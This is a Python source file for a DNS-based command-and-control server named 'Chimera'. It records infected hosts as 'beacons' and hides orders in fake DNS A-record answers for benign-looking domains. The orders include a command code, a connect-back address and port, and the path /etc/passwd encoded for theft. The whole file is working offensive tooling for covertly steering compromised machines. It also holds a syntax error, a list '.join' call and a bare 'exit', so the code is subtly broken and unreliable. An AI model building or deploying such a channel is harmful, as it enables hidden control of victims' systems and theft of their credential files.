import socket
import struct
import sys
import random
import time
import os

if (len(sys.argv) != 2):
    print("Usage: server.py {ip to listen on}")
    exit
else:
    LISTEN_IP = sys.argv[1]

def parse_qname(data, offset):
    qname = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        qname.append(data[offset + 1: offset + 1 + length].decode())
        offset += 1 + length
    return ".".join(qname), offset

def build_response(query, response_ips):
    txid = query[0:2]
    flags = b'\x81\x80'  # Standard response
    qdcount = query[4:6]
    ancount = struct.pack('!H', len(response_ips))
    nscount = arcount = b'\x00\x00'

    header = txid + flags + qdcount + ancount + nscount + arcount

    qname, q_end = parse_qname(query, 12)
    question = query[12:q_end + 4]

    answers = b''
    for ip in response_ips:
        answers += (
            b'\xc0\x0c' +                 # NAME (pointer to domain name)
            struct.pack('!H', 1) +        # TYPE: A
            struct.pack('!H', 1) +        # CLASS: IN
            struct.pack('!I', 60) +       # TTL
            struct.pack('!H', 4) +        # RDLENGTH
            socket.inet_aton(ip)          # RDATA
        )

    return header + question + answers

def handleResponse(sock, query, addr, ips):
    response = build_response(query, ips)
    sock.sendto(response, addr)

def sendResponseA(sock, data, addr, command):
    handleResponse(sock, data, addr, ["" + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(command)])

def sendResponseB(sock, data, addr, destIP, destPort):
    if(int(destPort) < 256):
        value1 = str(destPort)
        value2 = "0"
    else:
        value1 = "255"
        value2 = str(destPort - 255)
    handleResponse(sock, data, addr, [destIP, value1 + "." + value2 + "." + str(random.randint(1,254)) + ".3"])
    
def sendResponseC(sock, data, addr, fileName):
    addressListSplit = []
    for char in fileName:
        addressListSplit.append(ord(char))
    addressListSplit.append(3)
    
    x = 0
    y = 0
    currentAddr = ""
    addressList = []
    
    while (x < len(addressListSplit)):
        if (y == 4):
            y = 0
            addressList.append(currentAddr)
            currentAddr = ""
        currentAddr += (str(addressListSplit[x]) + ".")
            
        y = y + 1
        x = x + 1
    addressList.append(currentAddr)
    while (len((addressList[len(addressList) - 1]).split('.')) < 5):
        addressList[len(addressList) - 1] += (str(random.randint(1,254)) + ".")
        
    x = 0
    while (x < len(addressList)):
        addressList[x] = addressList[x][:-1]
        x = x + 1

    handleResponse(sock, data, addr, addressList)

def run(bind_ip=LISTEN_IP, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_ip, port))
    print(f"[+] Chimera server listening on {bind_ip}:{port}")

    while True:
        data, addr = sock.recvfrom(512)
        domain, _ = parse_qname(data, 12)
        domain = domain.lower().strip('.')

        print(f"[>] Message from {addr[0]}:{addr[1]} for {domain}")
        
        if not (os.path.exists("/tmp/chimera/"):
            os.system("mkdir /tmp/chimera/")
        
        filePath = "/tmp/chimera/" + addr[0]
        if not (os.path.exists(filePath)):
            print("New beacon identified from " + addr[0] + ".")
            open(filePath, "w").close()
            
        f = open(filePath, "r")
        currentConts = f.read()
        f.close()
        contSplit = currentConts.split('\n')
        del(contSplit[0])
        newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
        newCont = newContSplit.join('\n')
        f = open(filePath, "w")
        f.write(newCont)
        f.close()
        
        if (domain == "supportcenter.net"):
            sendResponseA(sock, data, addr, 100)
        elif (domain == "freegames.net"):
            sendResponseA(sock, data, addr, 100)
        elif (domain == "securelogin.com"):
            sendResponseB(sock, data, addr, "127.0.0.1", 279)
        elif (domain == "cloudlogin.com"):
            sendResponseB(sock, data, addr, "127.0.0.1", 279)
        elif (domain == "fileshare.org"):
            sendResponseC(sock, data, addr, "/etc/passwd")

run()
